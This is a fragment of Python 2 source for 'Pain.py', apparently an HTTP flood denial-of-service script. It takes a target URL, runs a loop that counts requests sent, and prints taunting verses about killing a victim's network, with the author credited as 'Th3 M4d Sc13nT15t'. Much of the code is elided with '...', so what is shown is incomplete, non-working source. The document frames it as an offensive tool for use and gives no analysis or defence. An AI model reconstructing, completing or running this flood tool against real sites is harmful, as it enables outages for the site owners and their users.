...
def usage():
	print 'Usage: Pain.py (url)'
	print 'For Skript Kiddies: Pain.py http://target.com/'
	print "\a"
print \
"""
...
def httpcall(url):
	...
	try:
			...
			set_flag(1)
 			print '                                                                    '
 			print 'Is Your Network Up? We simply Cant Tell'
 			print 'Our Scripts Will Bring You Strait To Hell'
 			print 'The Pain Is So Great, We Will Get In So Deep'
 			print 'Your Network Is Dead, We Want To See You Cry And Weep'
 			print '                                                                    '
			code=500
	...
	def run(self):
		...
		while flag==0:
			if (previous+150<request_counter) & (previous<>request_counter):
				print "Pain.py Factory Sent: %d " % (request_counter)
				previous=request_counter
		if flag==2:
...
if len(sys.argv) < 2:
	...
	if sys.argv[1]=="help":
		...
		print "Welcome To Hell, The Weather Is Warm"
		print "C0d3d By Th3 M4d Sc13nT15t"
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
		url = sys.argv[1]
